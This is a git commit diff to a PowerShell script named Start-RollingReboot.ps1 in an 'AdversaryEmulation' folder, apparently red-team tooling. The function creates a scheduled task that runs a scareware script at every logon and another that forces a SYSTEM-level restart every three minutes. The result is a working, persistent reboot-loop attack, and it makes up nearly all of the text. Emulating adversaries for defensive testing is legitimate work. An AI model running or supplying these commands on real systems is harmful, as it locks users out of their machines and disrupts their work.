343b9e38fbffc71c181931085b49ec04bd540d85
Victor Fernandez III <48382964+cyberphor@users.noreply.github.com>
2021-05-25 02:55:46 -0600

    Update Start-RollingReboot.ps1

--- AdversaryEmulation/Start-RollingReboot.ps1
+++ AdversaryEmulation/Start-RollingReboot.ps1
@@ -1,5 +1,5 @@
 function RollingReboot {
-    schtasks.exe /create /tn "Scare" /tr "powershell -c 'C:\scare.ps1'" /sc onlogon /it
+    schtasks.exe /create /tn "Cause" /tr "powershell -c 'C:\Start-Scareware.ps1'" /sc onlogon /it
     schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3 
 }
 
